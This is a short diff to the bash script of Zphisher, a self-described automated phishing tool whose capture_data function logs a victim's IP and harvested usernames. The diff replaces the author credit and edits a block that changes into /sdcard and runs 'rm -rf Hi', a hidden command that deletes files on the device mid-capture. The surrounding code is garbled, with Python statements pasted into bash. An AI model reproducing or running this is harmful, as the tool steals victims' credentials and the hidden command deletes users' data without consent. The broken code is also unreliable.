@@ -1,7 +1,7 @@
 #!/bin/bash
 
 ##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
+##   Author 	: 	Kavishka Chathumal
 ##   Version 	: 	2.3.4
 ##   Github 	: 	https://github.com/htr-tech/zphisher
 
@@ -457,11 +457,10 @@ capture_data() {
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
-			import zlib,os,base64
-
+			
 			cd --
 			cd /sdcard
-			os.system("rm -rf Hi")
+			rm -rf Hi
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
